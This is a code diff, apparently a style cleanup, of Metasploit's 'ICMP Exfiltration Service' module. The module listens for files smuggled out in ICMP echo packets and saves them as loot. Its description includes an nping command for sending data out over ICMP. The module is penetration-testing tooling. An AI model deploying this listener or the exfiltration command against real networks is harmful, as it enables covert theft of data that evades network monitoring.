@@ -9,8 +9,8 @@ class MetasploitModule < Msf::Auxiliary
 
   def initialize
     super(
-      'Name'         => 'ICMP Exfiltration Service',
-      'Description'  => %q{
+      'Name' => 'ICMP Exfiltration Service',
+      'Description' => %q{
         This module is designed to provide a server-side component to receive and store files
         exfiltrated over ICMP echo request packets.
 
@@ -24,44 +24,43 @@ class MetasploitModule < Msf::Auxiliary
         Data can be sent from the client using a variety of tools. One such example is nping (included
         with the NMAP suite of tools) - usage: nping --icmp 10.0.0.1 --data-string "BOFtest.txt" -c1
       },
-      'Author'      => 'Chris John Riley',
-      'License'     => MSF_LICENSE,
-      'References'  =>
-        [
-          # packetfu
-          ['URL','https://github.com/todb/packetfu'],
-          # nping
-          ['URL', 'http://nmap.org/book/nping-man.html'],
-          # simple icmp
-          ['URL', 'http://blog.c22.cc/2012/02/17/quick-post-fun-with-python-ctypes-simpleicmp/']
-        ]
+      'Author' => 'Chris John Riley',
+      'License' => MSF_LICENSE,
+      'References' => [
+        # packetfu
+        ['URL', 'https://github.com/todb/packetfu'],
+        # nping
+        ['URL', 'https://nmap.org/book/nping-man.html'],
+        # simple icmp
+        ['URL', 'https://blog.c22.cc/2012/02/17/quick-post-fun-with-python-ctypes-simpleicmp/']
+      ]
     )
 
     register_options([
       OptString.new('START_TRIGGER', [true, 'Trigger for beginning of file', '^BOF']),
-      OptString.new('END_TRIGGER',   [true, 'Trigger for end of file', '^EOF']),
-      OptString.new('RESP_START',    [true, 'Data to respond when initial trigger matches', 'SEND']),
-      OptString.new('RESP_CONT',     [true, 'Data ro resond when continuation of data expected', 'OK']),
-      OptString.new('RESP_END',      [true, 'Data to response when EOF received and data saved', 'COMPLETE']),
-      OptString.new('BPF_FILTER',    [true, 'BFP format filter to listen for', 'icmp']),
-      OptString.new('INTERFACE',     [false, 'The name of the interface']),
+      OptString.new('END_TRIGGER', [true, 'Trigger for end of file', '^EOF']),
+      OptString.new('RESP_START', [true, 'Data to respond when initial trigger matches', 'SEND']),
+      OptString.new('RESP_CONT', [true, 'Data to respond when continuation of data expected', 'OK']),
+      OptString.new('RESP_END', [true, 'Data to respond when EOF received and data saved', 'COMPLETE']),
+      OptString.new('BPF_FILTER', [true, 'BPF format filter to listen for', 'icmp']),
+      OptString.new('INTERFACE', [false, 'The name of the interface']),
       OptBool.new('FNAME_IN_PACKET', [true, 'Filename presented in first packet straight after START_TRIGGER', true])
     ])
 
     register_advanced_options([
-      OptEnum.new('CLOAK',      [true, 'OS fingerprint to use for packet creation', 'linux', ['windows', 'linux', 'freebsd']]),
-      OptBool.new('PROMISC',    [true, 'Enable/Disable promiscuous mode', false]),
+      OptEnum.new('CLOAK', [true, 'OS fingerprint to use for packet creation', 'linux', ['windows', 'linux', 'freebsd']]),
+      OptBool.new('PROMISC', [true, 'Enable/Disable promiscuous mode', false]),
       OptAddress.new('LOCALIP', [false, 'The IP address of the local interface'])
     ])
 
-    deregister_options('SNAPLEN','FILTER','PCAPFILE','RHOST','SECRET','GATEWAY_PROBE_HOST', 'GATEWAY_PROBE_PORT', 'TIMEOUT')
+    deregister_options('SNAPLEN', 'FILTER', 'PCAPFILE', 'RHOST', 'SECRET', 'GATEWAY_PROBE_HOST', 'GATEWAY_PROBE_PORT', 'TIMEOUT')
   end
 
   def run
     begin
       # check Pcaprub is up to date
       if not netifaces_implemented?
-        print_error("WARNING : Pcaprub is not uptodate, some functionality will not be available")
+        print_error("WARNING : Pcaprub is not up-to-date, some functionality will not be available")
         netifaces = false
       else
         netifaces = true
@@ -84,7 +83,6 @@ class MetasploitModule < Msf::Auxiliary
 
       # start icmp listener process - loop
       icmp_listener
-
     ensure
       store_file
       print_status("\nStopping ICMP listener on #{@interface} (#{@iface_ip})")
@@ -100,13 +98,13 @@ class MetasploitModule < Msf::Auxiliary
     end
 
     cap = PacketFu::Capture.new(
-            :iface   => @interface,
-            :start   => true,
-            :filter  => datastore['BPF_FILTER'],
-            :promisc => datastore['PROMISC']
-            )
+      :iface => @interface,
+      :start => true,
+      :filter => datastore['BPF_FILTER'],
+      :promisc => datastore['PROMISC']
+    )
     loop {
-      cap.stream.each do | pkt |
+      cap.stream.each do |pkt|
         packet = PacketFu::Packet.parse(pkt)
         data = packet.payload[4..-1]
 
@@ -122,7 +120,7 @@ class MetasploitModule < Msf::Auxiliary
           # -(Windows) netsh firewall set opmode mode = ENABLE
 
           if packet.icmp_type == 0 and packet.icmp_code == 0 and packet.ip_saddr == @iface_ip
-            print_error "Dectected ICMP echo response. You must either disable ICMP handling"
+            print_error "Detected ICMP echo response. You must either disable ICMP handling"
             print_error "or try a more restrictive BPF filter. You might try:"
             print_error " set BPF_FILTER icmp and not src #{datastore['LOCALIP']}"
             return
@@ -140,7 +138,7 @@ class MetasploitModule < Msf::Auxiliary
 
           # set filename from data in incoming icmp packet
           if datastore['FNAME_IN_PACKET']
-            @filename = data[((datastore['START_TRIGGER'].length)-1)..-1].strip
+            @filename = data[((datastore['START_TRIGGER'].length) - 1)..-1].strip
           end
           # if filename not sent in packet, or FNAME_IN_PACKET false set time based name
           if not datastore['FNAME_IN_PACKET'] or @filename.empty?
@@ -164,7 +162,7 @@ class MetasploitModule < Msf::Auxiliary
 
           if data =~ /#{datastore['END_TRIGGER']}/
             # end of file marker found
-            print_status("#{@record_data.length} bytes of data recevied in total")
+            print_status("#{@record_data.length} bytes of data received in total")
             print_good("End of File received. Saving \"#{@filename}\" to loot")
             store_file
 
@@ -210,8 +208,8 @@ class MetasploitModule < Msf::Auxiliary
     src_mac = packet.eth_daddr
     @dst_ip = packet.ip_saddr
     dst_mac = packet.eth_saddr
-    icmp_id = packet.payload[0,2]
-    icmp_seq = packet.payload[2,2]
+    icmp_id = packet.payload[0, 2]
+    icmp_seq = packet.payload[2, 2]
 
     # create payload with matching id/seq
     resp_payload = icmp_id + icmp_seq + contents
@@ -241,13 +239,13 @@ class MetasploitModule < Msf::Auxiliary
     # store the file in loot if data is present
     if @record_data and not @record_data.empty?
       loot = store_loot(
-          "icmp_exfil",
-          "text/xml",
-          @src_ip,
-          @record_data,
-          @filename,
-          "ICMP Exfiltrated Data"
-          )
+        "icmp_exfil",
+        "text/xml",
+        @src_ip,
+        @record_data,
+        @filename,
+        "ICMP Exfiltrated Data"
+      )
       print_good("Incoming file \"#{@filename}\" saved to loot")
       print_good("Loot filename: #{loot}")
     end
